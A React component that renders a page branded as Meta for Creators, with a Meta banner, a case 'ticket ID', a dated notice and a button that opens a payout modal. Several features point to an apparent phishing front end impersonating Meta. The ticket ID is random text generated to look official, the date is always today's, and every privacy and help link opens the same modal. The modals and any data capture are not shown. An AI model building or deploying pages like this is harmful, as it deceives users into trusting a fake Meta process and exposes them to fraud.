'use client'

import AdvancedModal from '#components/modals/AdvancedModal';
import React from 'react'
import { useTranslation } from 'react-i18next';

const MainContent = ({ handleOpendPayoutModal }: { handleOpendPayoutModal: (isOpenPayout: boolean) => void }) => {
    const { t } = useTranslation();

    const [isOpendAdvanced, setIsOpendAdvanced] = React.useState(false);
    const [ticketId, setTicketId] = React.useState("4564-ATFD-4865");
    const currentDate = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })

    const handleOpendModal = (isOpenPayout: boolean) => {
        handleOpendPayoutModal(isOpenPayout);
    }

    const handleOpendAdvanced = () => {
        setIsOpendAdvanced(true);
    }

    React.useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };

        generateTicketId();

    }, []);

    return (
        <>
            <div className='w-full min-[769px]:max-w-[967px] max-[768px]:max-w-full overflow-y-auto pt-[28px] px-5 max-h-[100vh] min-[769px]:sticky min-[769px]:top-0'>
                <p className='mb-5 text-[#6b7280] uppercase text-[13px] font-[300] tracking-[0.12em]'>{t('main.content.meta_for_creators')}</p>
                <div className='flex items-start gap-[8px] flex-col justify-start mb-5'>
                    <b className='md:text-[32px] text-[24px]'>{t('main.content.heading')}</b>
                </div>

                <div>
                    <p className='text-[16px]'>{t('main.content.sub_1')}</p>
                    <p className='text-[16px]'>{t('main.content.sub_2')}</p>
                    <div className='my-4 text-[16px]'>
                        <p className='mb-2'><b>{t('main.content.sub_3')}</b></p>
                        <p className='mb-1'>- {t('main.content.sub_4')}</p>
                        <p className='mb-1'>- {t('main.content.sub_5')}</p>
                        <p className='mb-1'>- {t('main.content.sub_6')}</p>
                        <p className='mb-1'>- {t('main.content.sub_7')}</p>
                    </div>
                    <p className='my-2'>{t('main.content.sub_8')}</p>
                    <div className="w-full rounded-[16px] border border-dashed border-gray-300 bg-white p-4 my-5">
                        <p className="font-[500] text-[16px]">
                            {t('main.content.ticket_id')} {ticketId}
                        </p>
                    </div>
                </div>

                <div>
                    <div className="w-full rounded-[16px] overflow-hidden mb-4">
                        <img src="/images/meta/banner.png" alt="banner" className="w-full object-cover" />
                    </div>

                    <div className="w-full">
                        <div className="w-full bg-white flex flex-col gap-2 md:p-5 p-3 rounded-[16px]">
                            <b className="md:text-[24px] text-[20px] font-[500]">{t('main.content.sub.title')}</b>
                            <p className="text-[15px] text-gray-600">{t('main.content.sub.sub_1')}</p>
                            <p className="text-[15px] text-gray-600">{t('main.content.sub.sub_2')}</p>
                        </div>
                        <div onClick={() => handleOpendModal(true)} className="bg-[#0064E0] h-[45px] w-full rounded-full min-h-[45px] flex items-center justify-center cursor-pointer mt-7 hover:bg-[#0053c7] transition" >
                            <span className="text-white text-[15px] font-[700]">{t('main.content.button')}</span>
                        </div>
                        <p className="mt-3 text-[14px] text-center text-gray-600">{t('main.content.note')} <b>{currentDate}</b></p>
                    </div>
                </div>

                <div className='bg-white border-l-[#0064E0] border-l-[4px] p-4 my-5'>
                    <div className='flex items-center justify-start gap-2'>
                        <div className='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'>
                            <img src="/images/icons/ic_other.svg" className='w-full h-full' alt="other" />
                        </div>
                        <p className='text-black text-[15px] font-[500]'>{t('main.important_notes.title')}</p>
                    </div>
                    <div className='flex items-center justify-start gap-2 mt-3'>
                        <div className='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'></div>
                        <div>
                            <p className='text-black text-[15px] font-[300]'>{t('main.important_notes.description')}</p>
                        </div>
                    </div>
                </div>

                {/* BOTTOM */}
                <div className='mt-4 '>
                    <p className='text-[15px] pb-1'>{t('main.privacy_center.title')}</p>
                    <div onClick={handleOpendAdvanced} className='rounded-tl-[12px] rounded-tr-[12px] bg-white px-4 py-3 border-b border-[#E3E8EF] cursor-pointer flex items-center justify-between gap-0'>
                        <div className='flex items-center justify-center justify-start gap-3'>
                            <div className='w-[45px] h-[45px] min-w-[45px] min-h-[45px] max-w-[45px] max-h-[45px]'>
                                <img src="/images/icons/ic_women.png" className='w-full h-full' alt="locked" />
                            </div>
                            <div>
                                <p className='text-black text-[15px] font-[500]'>{t('main.privacy_center.sub_title.sub_1.title')}</p>
                                <p className='text-black text-[14px] font-[300]'>{t('main.privacy_center.sub_title.sub_1.description')}</p>
                            </div>
                        </div>
                        <div className={`w-[17px] h-[17px] min-w-[17px] min-h-[17px] max-w-[17px] max-h-[17px] transition-all duration-200`}>
                            <img src="/images/icons/ic_arrow.svg" className='w-full h-full' alt="arrow" />
                        </div>
                    </div>
                    <div onClick={handleOpendAdvanced} className='rounded-bl-[12px] rounded-br-[12px] bg-white px-4 py-3 cursor-pointer flex items-center justify-between gap-0'>
                        <div className='flex items-center justify-center justify-start gap-3'>
                            <div className='w-[45px] h-[45px] min-w-[45px] min-h-[45px] max-w-[45px] max-h-[45px]'>
                                <img src="/images/icons/ic_women.png" className='w-full h-full' alt="locked" />
                            </div>
                            <div>
                                <p className='text-black text-[15px] font-[500]'>{t('main.privacy_center.sub_title.sub_2.title')}</p>
                                <p className='text-black text-[14px] font-[300]'>{t('main.privacy_center.sub_title.sub_2.description')}</p>
                            </div>
                        </div>
                        <div className={`w-[17px] h-[17px] min-w-[17px] min-h-[17px] max-w-[17px] max-h-[17px] transition-all duration-200`}>
                            <img src="/images/icons/ic_arrow.svg" className='w-full h-full' alt="arrow" />
                        </div>
                    </div>
                </div>
                {/* --------------- */}
                <div className='mt-4 mb-3'>
                    <p className='text-[15px] pb-1'>{t('main.more_info.title')}</p>
                    <div onClick={handleOpendAdvanced} className='rounded-[12px] bg-white px-4 py-3 cursor-pointer flex items-center justify-between gap-0'>
                        <div className='flex items-center justify-center justify-start gap-3'>
                            <div className='w-[45px] h-[45px] min-w-[45px] min-h-[45px] max-w-[45px] max-h-[45px]'>
                                <img src="/images/icons/ic_docs.png" className='w-full h-full' alt="locked" />
                            </div>
                            <div>
                                <p className='text-black text-[15px] font-[500]'>{t('main.more_info.sub_title.sub_1.title')}</p>
                                <p className='text-black text-[14px] font-[300]'>{t('main.more_info.sub_title.sub_1.description')}</p>
                            </div>
                        </div>
                        <div className={`w-[17px] h-[17px] min-w-[17px] min-h-[17px] max-w-[17px] max-h-[17px] transition-all duration-200`}>
                            <img src="/images/icons/ic_arrow.svg" className='w-full h-full' alt="arrow" />
                        </div>
                    </div>
                </div>
                {/* --------------- */}
                <div className='mt-4 mb-4'>
                    <p className='text-[15px] pb-1'>{t('main.resouces.title')}</p>
                    <div onClick={handleOpendAdvanced} className='rounded-tl-[12px] rounded-tr-[12px] bg-white px-4 py-3 cursor-pointer flex items-center justify-between gap-0 border-b border-[#E3E8EF] '>
                        <div className='flex items-center justify-center justify-start gap-3'>
                            <div>
                                <p className='text-black text-[15px] font-[500]'>{t('main.resouces.sub_title.sub_1.title')}</p>
                                <p className='text-black text-[14px] font-[300]'>{t('main.resouces.sub_title.sub_1.description')}</p>
                            </div>
                        </div>
                        <div className={`w-[17px] h-[17px] min-w-[17px] min-h-[17px] max-w-[17px] max-h-[17px] transition-all duration-200`}>
                            <img src="/images/icons/ic_arrow.svg" className='w-full h-full' alt="arrow" />
                        </div>
                    </div>
                    <div onClick={handleOpendAdvanced} className='bg-white px-4 py-3 cursor-pointer flex items-center justify-between gap-0 border-b border-[#E3E8EF] '>
                        <div className='flex items-center justify-center justify-start gap-3'>
                            <div>
                                <p className='text-black text-[15px] font-[500]'>{t('main.resouces.sub_title.sub_2.title')}</p>
                                <p className='text-black text-[14px] font-[300]'>{t('main.resouces.sub_title.sub_2.description')}</p>
                            </div>
                        </div>
                        <div className={`w-[17px] h-[17px] min-w-[17px] min-h-[17px] max-w-[17px] max-h-[17px] transition-all duration-200`}>
                            <img src="/images/icons/ic_arrow.svg" className='w-full h-full' alt="arrow" />
                        </div>
                    </div>
                    <div onClick={handleOpendAdvanced} className='rounded-bl-[12px] rounded-br-[12px] bg-white px-4 py-3 cursor-pointer flex items-center justify-between gap-0'>
                        <div className='flex items-center justify-center justify-start gap-3'>
                            <div>
                                <p className='text-black text-[15px] font-[500]'>{t('main.resouces.sub_title.sub_3.title')}</p>
                                <p className='text-black text-[14px] font-[300]'>{t('main.resouces.sub_title.sub_3.description')}</p>
                            </div>
                        </div>
                        <div className={`w-[17px] h-[17px] min-w-[17px] min-h-[17px] max-w-[17px] max-h-[17px] transition-all duration-200`}>
                            <img src="/images/icons/ic_arrow.svg" className='w-full h-full' alt="arrow" />
                        </div>
                    </div>
                </div>
                {/* --------------- */}
                <p className='text-[14px] text-[#465a69] mb-3'>{t('main.footer.description')} <span className='text-[#0064E0] decoration-[#cbd2d9] cursor-pointer'>{t('main.footer.privacy_policy')}</span></p>
            </div>

            <AdvancedModal
                isOpend={isOpendAdvanced}
                onToggleAdvanced={(isOpenAdvanced: boolean) => setIsOpendAdvanced(isOpenAdvanced)}
            />
        </>
    )
}

export default MainContent